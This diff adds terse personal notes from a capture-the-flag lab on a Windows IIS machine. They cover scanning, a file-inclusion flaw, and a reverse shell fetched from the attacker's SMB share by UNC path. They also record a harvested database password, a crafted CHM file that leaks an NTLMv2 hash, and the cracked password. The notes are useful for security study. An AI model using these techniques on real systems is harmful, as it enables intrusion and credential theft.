@@ -1,0 +1,72 @@
+# Recon
+# comm tcp
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+
+# all tcp
+49667/tcp open  msrpc         Microsoft Windows RPC
+
+# Enum
+## smb,netbios
+smbclient, smbmap, nbtscan, enum4linux => nothing.
+
+## 80 http
+gobuster =>
+/images/ (Status: 403)
+/blog/ (Status: 200)
+/user/ (Status: 302)
+/css/ (Status: 403)
+/js/ (Status: 403)
+
+/user/ => need to login.
+registered a account=> "under construction"
+also used sqlmap -r post.req to test the registration => nope
+
+/blog/ =>
+find links like: /blog?lang=blog-en.php
+LFI? => tried C:\windows\win.in => nothing
+RFI => no
+SQLi => sqlmap => no
+tried /blog/?lang=css/style.css => can read a file. but cannot read ../user/login.php
+tried wfuzz => nothing.
+
+(get hint) not sure why, but \windows\win.ini works, just don't include C:\
+(get hint) impacket-smbserver doesn't work. Try linux one.
+guess, maybe the target blocks http requests
+create a rev.exe and put \\xxxx\tester\rev.exe in command, failed!
+But somehow nc.exe will work, maybe AV thing.
+=> got foothold
+
+# Priv Esc
+## Get Chris
+Found the user has Impersonate priv, maybe juicy potato (?)
+in C:\inetpub\wwwroot\user\db.php, find => 
+$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper")
+
+tried this pass with chris to use smb, success, but psexec failed, no writable.
+change config and dir permission to get it.
+
+## Get root
+find instructions.chm, use xchm to read=>
+Sniper Android App Documentation
+Table of Contents
+Pff... This dumb CEO always makes me do all the shitty work. SMH! 
+I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him. 
+
+and C:\Docs\notes.txt
+=>
+Hi Chris,
+Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
+
+Regards,
+Sniper CEO.
+
+(read the answer, because my computer the html helper workstation cannot compile due to "cannot open xxx.chm". I used the an XP VM machine to fix this.)
+use smb ntmlv2 hash method, created an evil chm that includes an image to my smb share. => got hash.
+hashcat -m 5600 => butterfly!#1
